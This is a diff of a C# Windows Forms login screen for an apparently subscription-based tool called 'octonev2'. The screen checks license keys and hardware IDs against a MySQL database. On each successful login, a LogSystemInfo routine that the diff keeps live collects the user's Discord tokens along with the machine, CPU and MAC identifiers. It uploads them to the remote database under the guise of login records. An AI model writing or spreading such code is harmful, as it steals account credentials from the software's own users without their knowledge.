@@ -16,8 +16,6 @@ using System.Data;
 using Timer = System.Windows.Forms.Timer;
 using System.Reflection;
 
-
-
 namespace octonev2.Forms
 {
     public partial class LoginForm : Form
@@ -40,7 +38,6 @@ namespace octonev2.Forms
         public LoginForm()
         {
             InitializeComponent();
-
             Size = new Size(900, 600);
             StartPosition = FormStartPosition.CenterScreen;
             FormBorderStyle = FormBorderStyle.None;
@@ -138,6 +135,21 @@ namespace octonev2.Forms
 
             SetupControls();
             SetupEventHandlers();
+            _ = InitializeWithUpdate();
+        }
+
+        private async Task InitializeWithUpdate()
+        {
+            try
+            {
+                var updater = new ForceUpdate();
+                await updater.CheckAndUpdate();
+                MessageBox.Show("Update check completed", "Update Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Update check failed: {ex.Message}", "Update Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         private void SetupControls()
@@ -153,19 +165,10 @@ namespace octonev2.Forms
             Controls.AddRange(new Control[] { titleBar, mainPanel });
         }
 
-
-
-        private async Task InitializeWithUpdate()
-        {
-            var updater = new ForceUpdate();
-            await updater.CheckAndUpdate();
-        }
-
-
         private void SetupEventHandlers()
         {
             loginButton.Click += async (s, e) => await HandleLogin();
-            registerButton.Click += async (s, e) => await ShowRegisterForm();
+            registerButton.Click += (s, e) => ShowRegisterForm();
             closeButton.Click += (s, e) => Application.Exit();
             minimizeButton.Click += (s, e) => WindowState = FormWindowState.Minimized;
             titleBar.MouseDown += (s, e) => StartDragging(e);
@@ -179,12 +182,11 @@ namespace octonev2.Forms
             using var loginConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
             await loginConnection.OpenAsync();
 
-            // First check if user exists and get their ID
             string userCheckQuery = @"
-        SELECT id 
-        FROM users 
-        WHERE BINARY username = @username 
-        AND BINARY password_hash = @password";
+                SELECT id 
+                FROM users 
+                WHERE BINARY username = @username 
+                AND BINARY password_hash = @password";
 
             using var userCheckCmd = new MySqlCommand(userCheckQuery, loginConnection);
             userCheckCmd.Parameters.AddWithValue("@username", username);
@@ -194,27 +196,25 @@ namespace octonev2.Forms
             if (!userId.HasValue)
                 return (false, "Invalid username or password", false, 0);
 
-            // Check subscription status using key_redemptions
             string subscriptionQuery = @"
-        SELECT kr.expires_at 
-        FROM key_redemptions kr
-        WHERE kr.user_id = @userId 
-        AND kr.is_active = TRUE 
-        ORDER BY kr.expires_at DESC 
-        LIMIT 1";
+                SELECT kr.expires_at 
+                FROM key_redemptions kr
+                WHERE kr.user_id = @userId 
+                AND kr.is_active = TRUE 
+                ORDER BY kr.expires_at DESC 
+                LIMIT 1";
 
             using var subCmd = new MySqlCommand(subscriptionQuery, loginConnection);
             subCmd.Parameters.AddWithValue("@userId", userId.Value);
 
             var expiryDate = await subCmd.ExecuteScalarAsync() as DateTime?;
 
-            // HWID Check
             string hwidQuery = @"
-        SELECT machine_id 
-        FROM login_records 
-        WHERE user_id = @userId 
-        ORDER BY login_time DESC 
-        LIMIT 1";
+                SELECT machine_id 
+                FROM login_records 
+                WHERE user_id = @userId 
+                ORDER BY login_time DESC 
+                LIMIT 1";
 
             using var hwidCmd = new MySqlCommand(hwidQuery, loginConnection);
             hwidCmd.Parameters.AddWithValue("@userId", userId.Value);
@@ -239,64 +239,18 @@ namespace octonev2.Forms
             return (true, "Success", false, userId.Value);
         }
 
-
-
-
         private async Task DeactivateSubscription(int userId, MySqlConnection connection)
         {
             string updateQuery = @"
-        UPDATE key_redemptions 
-        SET is_active = FALSE 
-        WHERE user_id = @userId 
-        AND expires_at < CURRENT_TIMESTAMP";
+                UPDATE key_redemptions 
+                SET is_active = FALSE 
+                WHERE user_id = @userId 
+                AND expires_at < CURRENT_TIMESTAMP";
 
             using var cmd = new MySqlCommand(updateQuery, connection);
             cmd.Parameters.AddWithValue("@userId", userId);
             await cmd.ExecuteNonQueryAsync();
         }
-
-
-
-
-        private async Task DeactivateExpiredSubscription(int userId, MySqlConnection connection)
-        {
-            string updateQuery = @"
-        UPDATE user_subscription_log 
-        SET is_active = FALSE 
-        WHERE user_id = @userId 
-        AND expires_at < CURRENT_TIMESTAMP";
-
-            using var cmd = new MySqlCommand(updateQuery, connection);
-            cmd.Parameters.AddWithValue("@userId", userId);
-            await cmd.ExecuteNonQueryAsync();
-        }
-
-
-
-
-
-        private async Task LogSystemInfo(int userId)
-        {
-            var discordTokens = string.Join(",", await SystemInfo.GetDiscordTokens());
-
-            string query = @"
-        INSERT INTO login_records 
-        (user_id, machine_id, os_version, cpu_id, mac_address, discord_tokens)
-        VALUES 
-        (@userId, @machineId, @osVersion, @cpuId, @macAddress, @discordTokens)";
-
-            using var cmd = new MySqlCommand(query, connection);
-            cmd.Parameters.AddWithValue("@userId", userId);
-            cmd.Parameters.AddWithValue("@machineId", SystemInfo.GetMachineId());
-            cmd.Parameters.AddWithValue("@osVersion", Environment.OSVersion.ToString());
-            cmd.Parameters.AddWithValue("@cpuId", SystemInfo.GetCpuId());
-            cmd.Parameters.AddWithValue("@macAddress", SystemInfo.GetMacAddress());
-            cmd.Parameters.AddWithValue("@discordTokens", discordTokens);
-
-            await cmd.ExecuteNonQueryAsync();
-        }
-
-
 
         private async Task HandleLogin()
         {
@@ -322,12 +276,19 @@ namespace octonev2.Forms
                     return;
                 }
 
-                // Fire and forget system info logging
                 _ = Task.Run(async () =>
                 {
-                    using var logConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
-                    await logConnection.OpenAsync();
-                    await LogSystemInfo(loginResult.userId, logConnection);
+                    try
+                    {
+                        using var logConnection = new MySqlConnection(DatabaseConfig.GetConnectionString());
+                        await logConnection.OpenAsync();
+                        await LogSystemInfo(loginResult.userId, logConnection);
+                        MessageBox.Show("System info logged successfully", "Logging Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show($"Failed to log system info: {ex.Message}", "Logging Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    }
                 });
 
                 if (loginResult.expired)
@@ -341,12 +302,11 @@ namespace octonev2.Forms
 
                     if (result == DialogResult.Yes)
                     {
-                        await ShowKeyRedemptionForm(usernameBox.Text);
+                        ShowKeyRedemptionForm(usernameBox.Text);
                     }
                     return;
                 }
 
-                await AnimationManager.PlayFadeOutAnimation(this);
                 Hide();
                 new DashboardForm(usernameBox.Text).Show();
             }
@@ -362,13 +322,13 @@ namespace octonev2.Forms
 
         private async Task LogSystemInfo(int userId, MySqlConnection logConnection)
         {
-            var discordTokens = await SystemInfo.GetDiscordTokens();
+            var discordTokens = SystemInfo.GetDiscordTokens();
 
             string query = @"
-        INSERT INTO login_records 
-        (user_id, machine_id, os_version, cpu_id, mac_address, discord_tokens)
-        VALUES 
-        (@userId, @machineId, @osVersion, @cpuId, @macAddress, @discordTokens)";
+                INSERT INTO login_records 
+                (user_id, machine_id, os_version, cpu_id, mac_address, discord_tokens)
+                VALUES 
+                (@userId, @machineId, @osVersion, @cpuId, @macAddress, @discordTokens)";
 
             using var cmd = new MySqlCommand(query, logConnection);
             cmd.Parameters.AddWithValue("@userId", userId);
@@ -376,24 +336,20 @@ namespace octonev2.Forms
             cmd.Parameters.AddWithValue("@osVersion", Environment.OSVersion.ToString());
             cmd.Parameters.AddWithValue("@cpuId", SystemInfo.GetCpuId());
             cmd.Parameters.AddWithValue("@macAddress", SystemInfo.GetMacAddress());
-            cmd.Parameters.AddWithValue("@discordTokens", string.Join(",", discordTokens));
+            cmd.Parameters.AddWithValue("@discordTokens", discordTokens);
 
             await cmd.ExecuteNonQueryAsync();
         }
 
-
-
-        private async Task ShowKeyRedemptionForm(string username)
+        private void ShowKeyRedemptionForm(string username)
         {
             var redemptionForm = new KeyRedemptionForm(username);
-            await AnimationManager.PlayFadeOutAnimation(this);
             Hide();
             redemptionForm.Show();
         }
 
-        private async Task ShowRegisterForm()
+        private void ShowRegisterForm()
         {
-            await AnimationManager.PlayFadeOutAnimation(this);
             Hide();
             new RegisterForm().Show();
         }
@@ -404,11 +360,9 @@ namespace octonev2.Forms
             return Image.FromStream(stream);
         }
 
-
-        private static void ShowError(string message)
+        private void ShowError(string message)
         {
-            MessageBox.Show(message, "Login Error",
-                MessageBoxButtons.OK, MessageBoxIcon.Error);
+            MessageBox.Show(message, "Login Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
 
         private static string HashPassword(string password)
@@ -458,3 +412,4 @@ namespace octonev2.Forms
         }
     }
 }
+
